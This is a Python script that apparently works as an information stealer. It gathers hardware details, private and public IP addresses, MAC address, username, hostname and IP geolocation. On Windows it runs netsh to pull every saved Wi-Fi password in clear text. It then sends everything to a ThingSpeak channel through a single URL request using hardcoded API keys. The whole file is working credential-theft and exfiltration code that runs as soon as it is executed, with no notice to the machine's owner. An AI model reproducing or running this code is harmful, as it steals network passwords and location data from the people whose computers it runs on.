import socket
import urllib
import ipinfo
import requests
import platform
import psutil
import subprocess
from os import getlogin , name
info = {}
wifi = {}
# no need to copy this func
def gethardware():
    global info

    uname = platform.uname()
    info['System'] = uname.system
    info['Node_name'] = uname.node
    info['Release'] = uname.release
    info['Version'] = uname.version
    info['Machine'] = uname.machine
    info['processor'] = uname.processor
    info['Physical_cores'] = psutil.cpu_count(logical = False)
    info['Total_cores'] = psutil.cpu_count(logical = True)
    cpufreq = psutil.cpu_freq()
    info['max freq'] = str(cpufreq.max) + "Mhz"
    info['min freq'] = str(cpufreq.min) + "Mhz"
    info['current_freq'] = str(cpufreq.current) + "Mhz"
    net_io = psutil.net_io_counters()
    info['bytes_sent'] = net_io.bytes_sent
    info['bytes_recv'] = net_io.bytes_recv
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            if str(address.family) == 'AddressFamily.AF_INET':
                info['IP Address:'] =  address.address
                info['Netmask:'] =  address.netmask
                info['Broadcast IP:'] =  address.broadcast
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                info['MAC Address:']  = address.address
                info['Netmask:'] = address.netmask
                info['Broadcast MAC:'] = address.broadcast    
gethardware()
hostname = socket.gethostname()
private_ip = socket.gethostbyname(hostname)
public_ip = requests.get('https://api.ipify.org').text
username = getlogin()
ipinfo_token = '47e99ae9f013cd'
handler = ipinfo.getHandler(ipinfo_token)
location = handler.getDetails(public_ip).all
location = str(location)
for letter in location:
    if letter == ' ':
        location = location.replace(' ' , '%20')
    if letter == '\n':
        location = location.replace('\n' , '%0A') 
info = str(info)
for letter in info:
    if letter == ' ':
        info = info.replace(' ' , '%20')
    if letter == '\n':
        info = info.replace('\n' , '%0A') 
def wifi_code():
    global wifi
    if name == 'nt':
        profiles = []
        count=0

        #(1) Find all wifi profiles
        cmd_results = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8', errors ="backslashreplace")
        cmd_results = cmd_results.split("\r\n")
        profiles = [cmd_result.split(": ")[-1] for cmd_result in cmd_results if "All User Profile" in cmd_result]


 
        for index,profile in enumerate(profiles):
            cmd_results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors ="backslashreplace")
            password=[cmd_result.split(":")[1][1:] for cmd_result in cmd_results.split("\r\n") if "Key Content" in cmd_result]
            wifi[profile] = str(password)   
        wifi = str(wifi)
        for letter in wifi:
            if letter == ' ':
                wifi = wifi.replace(' ' , '%20')
            if letter == '\n':
                wifi = wifi.replace('\n' , '%0A')                 
                                  
wifi_code()
def send():
    url_2 = 'https://api.thingspeak.com/update?api_key='
    key = 'YJN62QS6RI6ASOV7'
    header = '&field1={}&field2={}&field3={}&field4={}&field5={}'.format("Public_IP:" + public_ip + ",Private_Ip:" + private_ip , "User:" + username+ ",Hostname:" + hostname , "Location_Info:" + location , "Hardware:" + info , "Wifi_Info:" + wifi)
    new_url = url_2 + key + header
    print(new_url)
    data=urllib.request.urlopen(new_url)    
    print(data)
    
send()    

